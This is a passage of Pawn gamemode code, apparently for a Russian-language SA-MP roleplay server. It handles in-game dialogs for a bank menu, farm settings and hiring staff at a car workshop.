			GetHouseOplata(PlayerInfo[playerid][pPHouseKey]),GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*3,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*5,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*12,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*24,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*72,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*168,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*336,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672);
			ShowPlayerDialogEx(playerid,9664,DIALOG_STYLE_LIST, "{FFFFFF}Оплатить квартплату банком | {AE433D}Банк",string, "Выбрать", "Назад");
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			DeletePVar(playerid,"Housemoney");
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_HOUSE"` SET hTakings = '%i' WHERE hID = '%d'", HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings], playerid);
            mysql_function_query(DATABASE,QUERY,false,"","");

			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pBank = '%i' WHERE name = '%e'", PlayerInfo[playerid][pBank], PlayerInfo[playerid][pName]);
            mysql_function_query(DATABASE,QUERY,false,"","");
		}
    case 9665:
	    {
            if(!response)
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				return true;
			}
			if(!(1 <= strval(inputtext) <= 99999999999)) return ShowPlayerDialogEx(playerid, 9665, DIALOG_STYLE_INPUT, "{FFFFFF}Перевести игроку с наличных | {AE433D}Банкомат","{FFFFFF}Введите сумму, которую хотите передать и имя игрока через пробел\n\nПример: ''212121 Ioan_Grozny''", "Выбрать", "Назад");
	    }
     case 9667:
		{
		    if(!response)
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 9666, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банк", string, "Далее", "Выйти");
				return true;
			}
			if(!(1 <= strval(inputtext) <= 99999999999)) return ShowPlayerDialogEx(playerid, 9667, DIALOG_STYLE_INPUT, "{FFFFFF}Перевести игроку со счёта | {AE433D}Банкомат","{FFFFFF}Введите сумму, которую хотите передать и имя игрока через пробел\n\nПример: ''212121 Ioan_Grozny''", "Выбрать", "Назад");
		}
	case 9600:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: ShowPlayerDialogEx(playerid, 9601, DIALOG_STYLE_INPUT, "Установить цену зерна","Введите цену зерна\n\nВНИМАНИЕ: Цена должна быть не менее 5 вирт\nи не более 15 вирт","Установить","Назад");
			case 1: ShowPlayerDialogEx(playerid, 9602, DIALOG_STYLE_INPUT, "Установить цену продуктов","Введите цену продуктов\n\nВНИМАНИЕ: Цена должна быть не менее 20 вирт\nи не более 30 вирт","Установить","Назад");
			case 2: ShowPlayerDialogEx(playerid, 9603, DIALOG_STYLE_INPUT, "Установить цену работы","Введите цену работы\n\nВНИМАНИЕ: Цена должна быть не менее 30 вирт\nи не более 200 вирт","Установить","Назад");
			case 3: ShowPlayerDialogEx(playerid, 9604, DIALOG_STYLE_INPUT, "Пополнить 'LandTax' счёт","Введите сумму для пополнения","Пополнить","Назад");
			case 4: ShowPlayerDialogEx(playerid, 9605, DIALOG_STYLE_INPUT, "Пополнить банк фермы","Введите сумму для пополнения","Пополнить","Назад");
			case 5: ShowPlayerDialogEx(playerid, 9606, DIALOG_STYLE_INPUT, "Вывести деньги с банка фермы","Введите сумму для вывода","Вывести","Назад");
			case 6: FarmStatsPay(playerid,GetPVarInt(playerid,"farm_id"));
			case 7: FarmStatsDay(playerid,GetPVarInt(playerid,"farm_id"));
			case 8: ShowPlayerDialogEx(playerid, 9607, DIALOG_STYLE_LIST, "Продаваемый продукт","Картофель\nВеселая трава","Применить","Назад");
			case 9..16: ShowPlayerDialogEx(playerid, 9608, DIALOG_STYLE_INPUT, "Нанять рабочего","Введите ид игрока в данное окно\n\nВНИМАНИЕ: Введите -1 для увольнения","Далее","Назад"), SetPVarInt(playerid,"farm_slot",listitem-8);
			}
		}
	case 9607:
		{
			if(!FGet(playerid) && GetPVarInt(playerid,"farm_rank") < 3) return true;
			if(!response)
			{
				format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
				format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
				return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
			}
			switch(listitem)
			{
			case 0: SCM(playerid,COLOR_BLUE," Продаваемый продукт: Картофель");
			case 1: SCM(playerid,COLOR_BLUE," Продаваемый продукт: Весёлая трава");
			}
			FarmInfo[GetPVarInt(playerid,"farm_id")][fProds_Selling] = listitem+1;
			format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
			format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
			return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
		}
	case 9608:
		{
			if(!FGet(playerid) || GetPVarInt(playerid,"farm_rank") < 3) return true;
			if(!response)
			{
				format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
				format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
				return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
			}
			switch(GetPVarInt(playerid,"farm_slot"))
			{
			case 1..3: format(string,50,"/finvite %i 1 %i",strval(inputtext),GetPVarInt(playerid,"farm_slot"));
			default: format(string,50,"/finvite %i 2 %i",strval(inputtext),GetPVarInt(playerid,"farm_slot")-3);
			}
			CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
			format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
			format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
			return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
		}
	case 9601:
		{
			if(!FGet(playerid) || GetPVarInt(playerid,"farm_rank") < 3) return true;
			new i = PlayerInfo[playerid][pPFarmKey];
			if(!response)
			{
				format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
				format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
				return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
			}
			if(strval(inputtext) < 5 || strval(inputtext) >= 15) return ShowPlayerDialogEx(playerid, 9601, DIALOG_STYLE_INPUT, "Установить цену зерна","Введите цену зерна\n\nВНИМАНИЕ: Цена должна быть не менее 5 вирт\nи не более 15 вирт","Установить","Назад");
			FarmInfo[i][fGrain_Price] = strval(inputtext);
			SendMes(playerid,COLOR_BLUE," Цена зерна установлена, в размере %i вирт",strval(inputtext));
			format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
			format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
			return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
		}
	case 9602:
		{
			if(!FGet(playerid) || GetPVarInt(playerid,"farm_rank") < 3) return true;
			new i = PlayerInfo[playerid][pPFarmKey];
			if(!response)
			{
				format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
				format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
				return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
			}
			if(strval(inputtext) <= 20 || strval(inputtext) >= 30) return ShowPlayerDialogEx(playerid, 9602, DIALOG_STYLE_INPUT, "Установить цену продуктов","Введите цену продуктов\n\nВНИМАНИЕ: Цена должна быть не менее 20 вирт\nи не более 30 вирт","Установить","Назад");
			FarmInfo[i][fProds_Price] = strval(inputtext);
			SendMes(playerid,COLOR_BLUE," Цена продажи продуктов установлена, в размере %i вирт",strval(inputtext));
			format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
			format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
			return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
		}
	case 9603:
		{
			if(!FGet(playerid) || GetPVarInt(playerid,"farm_rank") < 3) return true;
			new i = PlayerInfo[playerid][pPFarmKey];
			if(!response)
			{
				format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
				format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
				return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
			}
			if(strval(inputtext) < 30 || strval(inputtext) > 200) return ShowPlayerDialogEx(playerid, 9603, DIALOG_STYLE_INPUT, "Установить цену работы","Введите цену работы\n\nВНИМАНИЕ: Цена должна быть не менее 30 вирт\nи не более 200 вирт","Установить","Назад");
			FarmInfo[i][fZp] = strval(inputtext);
			SendMes(playerid,COLOR_BLUE," Цена работы установлена, в размере %i вирт",strval(inputtext));
			format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
			format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
			return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
		}
	case 9604:
		{
			if(!FGet(playerid) || GetPVarInt(playerid,"farm_rank") < 3) return true;
			new i = PlayerInfo[playerid][pPFarmKey];
			if(!response)
			{
				format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
				format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
				return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
			}
			if(FarmInfo[i][fLandTax]+strval(inputtext) > 84000) return SCM(playerid,COLOR_GREY," Неверная сумма. Максимально допустимая сумма 84000 вирт (7 дней)"), ShowPlayerDialogEx(playerid, 9604, DIALOG_STYLE_INPUT, "Пополнить 'LandTax' счёт","Введите сумму для пополнения","Пополнить","Назад");
			if(strval(inputtext) < 0 || strval(inputtext) > PlayerInfo[playerid][pBank]) return ShowPlayerDialogEx(playerid, 9604, DIALOG_STYLE_INPUT, "Пополнить 'LandTax' счёт","Введите сумму для пополнения","Пополнить","Назад");
			FarmInfo[i][fLandTax]+=strval(inputtext);
			PlayerInfo[playerid][pBank]-=strval(inputtext);
			SendMes(playerid,COLOR_BLUE," Вы перевели на 'LandTax' счёт фермы %i вирт",strval(inputtext));
			format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
			format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
			return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
		}
	case 9605:
		{
			if(!FGet(playerid) || GetPVarInt(playerid,"farm_rank") < 3) return true;
			new i = PlayerInfo[playerid][pPFarmKey];
			if(!response)
			{
				format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
				format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
				return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
			}
			if(FarmInfo[i][fBank] > 1000000000) return SCM(playerid,COLOR_GREY," Нет места!");
			if(strval(inputtext) < 0 || strval(inputtext) > PlayerInfo[playerid][pBank]) return ShowPlayerDialogEx(playerid, 9605, DIALOG_STYLE_INPUT, "Пополнить банк фермы","Введите сумму для пополнения","Пополнить","Назад");
			FarmInfo[i][fBank]+=strval(inputtext);
			PlayerInfo[playerid][pBank]-=strval(inputtext);
			SendMes(playerid,COLOR_BLUE," Вы пополнили счёт фермы на %i вирт",strval(inputtext));
			format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
			format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
			return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
		}
	case 9606:
		{
			if(!FGet(playerid)) return true;
			new i = PlayerInfo[playerid][pPFarmKey];
			if(!response)
			{
				format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
				format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
				return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
			}
			if(strval(inputtext) < 0 || strval(inputtext) > FarmInfo[i][fBank]) return ShowPlayerDialogEx(playerid, 9606, DIALOG_STYLE_INPUT, "Вывести деньги с банка фермы","Введите сумму для вывода","Вывести","Назад");
			FarmInfo[i][fBank]-=strval(inputtext);
			PlayerInfo[playerid][pBank]+=strval(inputtext);
			SendMes(playerid,COLOR_BLUE," Вы сняли со счёта фермы %i вирт",strval(inputtext));
			format(string,sizeof(string),"Установить цену зерна\nУстановить цену продуктов\nУстановить цену работы\nВвести вирты на счёт 'LandTax'\nВвести вирты на ферму\nВывести вирты с фермы\nСтатистика за прошлый час\nСтатистика за этот день");
			format(string,sizeof(string),"%s\nСменить продаваемый продукт\nНазначить Зама [1]\nНазначить Зама [2]\nНазначить Зама [3]\nНазначить Фермера [1]\nНазначить Фермера [2]\nНазначить Фермера [3]\nНазначить Фермера [4]\nНазначить Фермера [5]",string);
			return ShowPlayerDialogEx(playerid, 9600, DIALOG_STYLE_LIST, "Панель настроек",string, "Выбрать", "Отмена");
		}
	case 9592:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: ShowPlayerDialogEx(playerid, 6000, DIALOG_STYLE_INPUT, "Пополнить банк автомастерской","Введите сумму для пополнения","Пополнить","Назад");
			case 1: ShowPlayerDialogEx(playerid, 6001, DIALOG_STYLE_INPUT, "Пополнить 'LandTax' счёт","Введите сумму для пополнения","Пополнить","Назад");
			case 2: ShowPlayerDialogEx(playerid, 6002, DIALOG_STYLE_INPUT, "Снять деньги с банка","Введите сумму для снятия","Снять","Назад");
			case 3: ShowPlayerDialogEx(playerid, 6003, DIALOG_STYLE_INPUT, "Установить стоимость 1 продукта","Введите стоимость одного продукта\n\nВНИМАНИЕ: Сумма стоимости должна быть\nне менее 50 вирт и не более 100 вирт","Установить","Назад");
			case 4: ShowPlayerDialogEx(playerid, 6004, DIALOG_STYLE_INPUT, "Установить зарплату рабочим","Введите сумму зарплаты\n\nВНИМАНИЕ: Сумма должна быть не менее 1 вирт\nи не более 10 вирт","Установить","Назад");
			case 5..12: ShowPlayerDialogEx(playerid, 6005, DIALOG_STYLE_INPUT, "Нанять рабочего","Введите ид игрока в данное окно\n\nВНИМАНИЕ: Введите -1 для увольнения","Далее","Назад"), SetPVarInt(playerid,"w_slot",listitem-4);
			}
			return true;
		}
	case 6005:
		{
			if(!WGet(playerid)) return true;
			new i = GetPVarInt(playerid,"wShop");
			if(!response)
			{
				return ShowPlayerDialogEx(playerid, 9592, DIALOG_STYLE_LIST, "Панель управления","[1] Пополнить банк автомастерской\n[2] Пополнить 'LandTax' счёт\n[3] Снять деньги с банка\n[4] Установить стоимость 1 продукта\n[5] Установить зарплату рабочим\n[6] Нанять заместителя (1)\
					\n[7] Нанять заместителя (2)\n[8] Нанять заместителя (3)\n[9] Нанять механика (1)\n[10] Нанять механика (2)\n[11] Нанять механика (3)\n[12] Нанять механика (4)\n[13] Нанять механика (5)", "Выбрать", "Отмена");
			}
			if(!IsPlayerConnected(strval(inputtext)) && strval(inputtext) != -1) return SCM(playerid,COLOR_GREY," Игрок не в сети!"), ShowPlayerDialogEx(playerid, 6005, DIALOG_STYLE_INPUT, "Нанять рабочего","Введите ид игрока в данное окно\n\nВНИМАНИЕ: Введите -1 для увольнения","Далее","Назад");
			switch(GetPVarInt(playerid,"w_slot"))
			{
			case 1:
				{
					if(strval(inputtext) == -1)
					{
						if(strcmp(WorkshopInfo[i][wDeputy1],"None",true) == 0) return SCM(playerid,COLOR_GREY," Данный слот не занят!"), ShowPlayerDialogEx(playerid, 6005, DIALOG_STYLE_INPUT, "Нанять рабочего","Введите ид игрока в данное окно\n\nВНИМАНИЕ: Введите -1 для увольнения","Далее","Назад");
						SendMes(playerid,COLOR_BLUE," Вы уволили %s с должности заместителя [1]",WorkshopInfo[i][wDeputy1]), strmid(WorkshopInfo[i][wDeputy1],"None", 0, strlen("None"), 32);
					}
					else
					{
						strmid(WorkshopInfo[i][wDeputy1],PlayerInfo[strval(inputtext)][pName], 0, strlen(PlayerInfo[strval(inputtext)][pName]), 32);
						SendMes(playerid,COLOR_BLUE," Вы приняли %s на должность заместителя [1]",WorkshopInfo[i][wDeputy1]);
						SendMes(strval(inputtext),COLOR_BLUE," %s принял вас на должность заместителя [1]",PlayerInfo[playerid][pName]);
					}
				}
			case 2:
				{
					if(strval(inputtext) == -1)
					{
						if(strcmp(WorkshopInfo[i][wDeputy2],"None",true) == 0) return SCM(playerid,COLOR_GREY," Данный слот не занят!"), ShowPlayerDialogEx(playerid, 6005, DIALOG_STYLE_INPUT, "Нанять рабочего","Введите ид игрока в данное окно\n\nВНИМАНИЕ: Введите -1 для увольнения","Далее","Назад");
						SendMes(playerid,COLOR_BLUE," Вы уволили %s с должности заместителя [2]",WorkshopInfo[i][wDeputy2]), strmid(WorkshopInfo[i][wDeputy2],"None", 0, strlen("None"), 32);
					}
					else
					{
						strmid(WorkshopInfo[i][wDeputy2],PlayerInfo[strval(inputtext)][pName], 0, strlen(PlayerInfo[strval(inputtext)][pName]), 32);
						SendMes(playerid,COLOR_BLUE," Вы приняли %s на должность заместителя [2]",WorkshopInfo[i][wDeputy2]);
						SendMes(strval(inputtext),COLOR_BLUE," %s принял вас на должность заместителя [2]",PlayerInfo[playerid][pName]);
					}
				}
			case 3:
				{
					if(strval(inputtext) == -1)
					{
						if(strcmp(WorkshopInfo[i][wDeputy3],"None",true) == 0) return SCM(playerid,COLOR_GREY," Данный слот не занят!"), ShowPlayerDialogEx(playerid, 6005, DIALOG_STYLE_INPUT, "Нанять рабочего","Введите ид игрока в данное окно\n\nВНИМАНИЕ: Введите -1 для увольнения","Далее","Назад");
						SendMes(playerid,COLOR_BLUE," Вы уволили %s с должности заместителя [3]",WorkshopInfo[i][wDeputy3]), strmid(WorkshopInfo[i][wDeputy3],"None", 0, strlen("None"), 32);
					}
					else
					{
						strmid(WorkshopInfo[i][wDeputy3],PlayerInfo[strval(inputtext)][pName], 0, strlen(PlayerInfo[strval(inputtext)][pName]), 32);
						SendMes(playerid,COLOR_BLUE," Вы приняли %s на должность заместителя [3]",WorkshopInfo[i][wDeputy3]);
						SendMes(strval(inputtext),COLOR_BLUE," %s принял вас на должность заместителя [3]",PlayerInfo[playerid][pName]);
					}
				}
			case 4:
				{
					if(strval(inputtext) == -1)
					{
						if(strcmp(WorkshopInfo[i][wMechanic1],"None",true) == 0) return SCM(playerid,COLOR_GREY," Данный слот не занят!"), ShowPlayerDialogEx(playerid, 6005, DIALOG_STYLE_INPUT, "Нанять рабочего","Введите ид игрока в данное окно\n\nВНИМАНИЕ: Введите -1 для увольнения","Далее","Назад");
						SendMes(playerid,COLOR_BLUE," Вы уволили %s с должности механика [1]",WorkshopInfo[i][wMechanic1]), strmid(WorkshopInfo[i][wMechanic1],"None", 0, strlen("None"), 32);
					}
					else
					{
						strmid(WorkshopInfo[i][wMechanic1],PlayerInfo[strval(inputtext)][pName], 0, strlen(PlayerInfo[strval(inputtext)][pName]), 32);
						SendMes(playerid,COLOR_BLUE," Вы приняли %s на должность механика [1]",WorkshopInfo[i][wMechanic1]);
						SendMes(strval(inputtext),COLOR_BLUE," %s принял вас на должность механика [1]",PlayerInfo[playerid][pName]);
					}
				}
			case 5:
				{
					if(strval(inputtext) == -1)
					{
						if(strcmp(WorkshopInfo[i][wMechanic2],"None",true) == 0) return SCM(playerid,COLOR_GREY," Данный слот не занят!"), ShowPlayerDialogEx(playerid, 6005, DIALOG_STYLE_INPUT, "Нанять рабочего","Введите ид игрока в данное окно\n\nВНИМАНИЕ: Введите -1 для увольнения","Далее","Назад");
						SendMes(playerid,COLOR_BLUE," Вы уволили %s с должности механика [2]",WorkshopInfo[i][wMechanic2]), strmid(WorkshopInfo[i][wMechanic2],"None", 0, strlen("None"), 32);
					}
					else
					{
						strmid(WorkshopInfo[i][wMechanic2],PlayerInfo[strval(inputtext)][pName], 0, strlen(PlayerInfo[strval(inputtext)][pName]), 32);
						SendMes(playerid,COLOR_BLUE," Вы приняли %s на должность механика [2]",WorkshopInfo[i][wMechanic2]);
						SendMes(strval(inputtext),COLOR_BLUE," %s принял вас на должность механика [2]",PlayerInfo[playerid][pName]);
					}
				}
			case 6:
				{
					if(strval(inputtext) == -1)
					{
						if(strcmp(WorkshopInfo[i][wMechanic3],"None",true) == 0) return SCM(playerid,COLOR_GREY," Данный слот не занят!"), ShowPlayerDialogEx(playerid, 6005, DIALOG_STYLE_INPUT, "Нанять рабочего","Введите ид игрока в данное окно\n\nВНИМАНИЕ: Введите -1 для увольнения","Далее","Назад");
						SendMes(playerid,COLOR_BLUE," Вы уволили %s с должности механика [3]",WorkshopInfo[i][wMechanic3]), strmid(WorkshopInfo[i][wMechanic3],"None", 0, strlen("None"), 32);
					}
					else
					{
						strmid(WorkshopInfo[i][wMechanic3],PlayerInfo[strval(inputtext)][pName], 0, strlen(PlayerInfo[strval(inputtext)][pName]), 32);
						SendMes(playerid,COLOR_BLUE," Вы приняли %s на должность механика [3]",WorkshopInfo[i][wMechanic3]);
						SendMes(strval(inputtext),COLOR_BLUE," %s принял вас на должность механика [3]",PlayerInfo[playerid][pName]);
					}
				}
			case 7:
				{
					if(strval(inputtext) == -1)
					{
						if(strcmp(WorkshopInfo[i][wMechanic4],"None",true) == 0) return SCM(playerid,COLOR_GREY," Данный слот не занят!"), ShowPlayerDialogEx(playerid, 6005, DIALOG_STYLE_INPUT, "Нанять рабочего","Введите ид игрока в данное окно\n\nВНИМАНИЕ: Введите -1 для увольнения","Далее","Назад");
						SendMes(playerid,COLOR_BLUE," Вы уволили %s с должности механика [4]",WorkshopInfo[i][wMechanic4]), strmid(WorkshopInfo[i][wMechanic4],"None", 0, strlen("None"), 32);
					}
					else
					{
						strmid(WorkshopInfo[i][wMechanic4],PlayerInfo[strval(inputtext)][pName], 0, strlen(PlayerInfo[strval(inputtext)][pName]), 32);
						SendMes(playerid,COLOR_BLUE," Вы приняли %s на должность механика [4]",WorkshopInfo[i][wMechanic4]);
						SendMes(strval(inputtext),COLOR_BLUE," %s принял вас на должность механика [4]",PlayerInfo[playerid][pName]);
					}
				}
			case 8:
				{
					if(strval(inputtext) == -1)
					{
						if(strcmp(WorkshopInfo[i][wMechanic5],"None",true) == 0) return SCM(playerid,COLOR_GREY," Данный слот не занят!"), ShowPlayerDialogEx(playerid, 6005, DIALOG_STYLE_INPUT, "Нанять рабочего","Введите ид игрока в данное окно\n\nВНИМАНИЕ: Введите -1 для увольнения","Далее","Назад");
						SendMes(playerid,COLOR_BLUE," Вы уволили %s с должности механика [5]",WorkshopInfo[i][wMechanic5]), strmid(WorkshopInfo[i][wMechanic5],"None", 0, strlen("None"), 32);
					}
					else
					{
						strmid(WorkshopInfo[i][wMechanic5],PlayerInfo[strval(inputtext)][pName], 0, strlen(PlayerInfo[strval(inputtext)][pName]), 32);
						SendMes(playerid,COLOR_BLUE," Вы приняли %s на должность механика [5]",WorkshopInfo[i][wMechanic5]);
						SendMes(strval(inputtext),COLOR_BLUE," %s принял вас на должность механика [5]",PlayerInfo[playerid][pName]);
					}
				}
			}
			DeletePVar(playerid,"w_slot");
